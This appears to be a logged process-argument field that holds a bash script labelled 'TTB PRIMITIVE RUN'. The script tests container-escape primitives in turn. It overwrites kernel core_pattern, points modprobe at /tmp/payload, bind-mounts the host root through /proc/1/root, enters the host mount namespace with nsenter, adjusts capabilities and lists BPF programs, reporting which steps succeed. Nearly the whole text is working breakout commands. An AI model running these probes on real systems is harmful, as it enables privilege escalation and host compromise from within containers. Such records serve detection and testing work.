parent.arguments:
-c "echo "===== TTB PRIMITIVE RUN ====="
echo "KERNEL=$(uname -r)"
echo "CAPEFF=$(grep CapEff /proc/self/status)"
echo "--- P1 core_pattern ---"
ORIG=$(cat /proc/sys/kernel/core_pattern)
if echo '|/bin/true' > /proc/sys/kernel/core_pattern 2>/tmp/err1; then echo "P1=SUCCESS"; else echo "P1=FAIL $(cat /tmp/err1)"; fi
echo "$ORIG" > /proc/sys/kernel/core_pattern 2>/dev/null || true
echo "--- P2 modprobe_path ---"
ORIG2=$(cat /proc/sys/kernel/modprobe)
if echo '/tmp/payload' > /proc/sys/kernel/modprobe 2>/tmp/err2; then echo "P2=SUCCESS"; else echo "P2=FAIL $(cat /tmp/err2)"; fi
echo "$ORIG2" > /proc/sys/kernel/modprobe 2>/dev/null || true
echo "--- P3 bind-mount host root ---"
mkdir -p /mnt/hostroot
if mount --bind /proc/1/root /mnt/hostroot 2>/tmp/err3; then echo "P3=SUCCESS $(head -c 40 /mnt/hostroot/etc/hostname)"; umount /mnt/hostroot; else echo "P3=FAIL $(cat /tmp/err3)"; fi
echo "--- P4 setns into host mount ns ---"
if nsenter -t 1 -m -- true 2>/tmp/err4; then echo "P4=SUCCESS"; else echo "P4=FAIL $(cat /tmp/err4)"; fi
echo "--- P5 capset ---"
if setpriv --bounding-set=-sys_admin /bin/true 2>/tmp/err5; then echo "P5=SUCCESS"; else echo "P5=FAIL $(cat /tmp/err5)"; fi
echo "--- P6 bpf ---"
if bpftool prog list >/tmp/bpfout 2>/tmp/err6; then echo "P6=SUCCESS $(wc -l < /tmp/bpfout) programs"; else echo "P6=FAIL $(cat /tmp/err6)"; fi
echo "===== RUN COMPLETE ====="
sleep 20
"
